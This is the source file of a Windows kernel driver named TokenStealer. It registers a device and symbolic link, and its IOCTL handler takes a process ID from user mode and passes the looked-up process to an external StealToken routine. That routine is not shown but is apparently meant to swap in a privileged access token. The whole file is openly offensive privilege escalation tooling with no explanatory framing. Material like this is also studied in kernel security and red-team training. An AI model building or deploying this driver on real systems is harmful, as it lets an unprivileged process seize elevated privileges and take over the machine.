#include <ntifs.h>
#include "TokerStealer.h"

void DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS DriverIOCTLFunction(PDEVICE_OBJECT DeviceObject, PIRP Irp);
extern "C" int StealToken(PEPROCESS * Process);

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	KdPrint((DRIVER_PREFIX "Driver was loaded\n"));
	UNREFERENCED_PARAMETER(RegistryPath);
	DriverObject->DriverUnload = DriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverIOCTLFunction;

	PDEVICE_OBJECT DeviceObject = nullptr;
	bool symbolicLinkCreated = FALSE;
	auto status = STATUS_SUCCESS;
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\TokenStealer");
	do {
		status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Error in creating device ): (0x%08x)\n", status));
			break;
		}
		DeviceObject->Flags |= DO_BUFFERED_IO;

		status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Error in creating symbolic link ): (0x%08x)\n", status));
			break;
		}
		symbolicLinkCreated = TRUE;

	} while (FALSE);

	if (!NT_SUCCESS(status)) {
		if (symbolicLinkCreated) {
			IoDeleteSymbolicLink(&symbolicLink);
		}
		if (DeviceObject) {
			IoDeleteDevice(DeviceObject);
		}
	}

	return status;
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	KdPrint((DRIVER_PREFIX "Driver was unloaded\n"));
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	PIO_STACK_LOCATION IrpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	switch (IrpStackLocation->MajorFunction)
	{
	case IRP_MJ_CREATE:
		KdPrint((DRIVER_PREFIX "Handle to SymbolicLink was created\n"));
		break;
	case IRP_MJ_CLOSE:
		KdPrint((DRIVER_PREFIX "Handle to SymbolicLink was closed\n"));
		break;
	default:
		break;
	}
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DriverIOCTLFunction(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	auto status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IrpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	ULONG processId = 0;
	PEPROCESS Process;
	RtlZeroMemory(&Process, sizeof(PEPROCESS));
	switch (IrpStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_CHANGE_TOKEN:
		processId = ((Data*)Irp->AssociatedIrp.SystemBuffer)->ProcessId;
		KdPrint((DRIVER_PREFIX "Process Id: %d\n", processId));
		PsLookupProcessByProcessId((HANDLE)processId, &Process);
		StealToken(&Process);
		break;
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}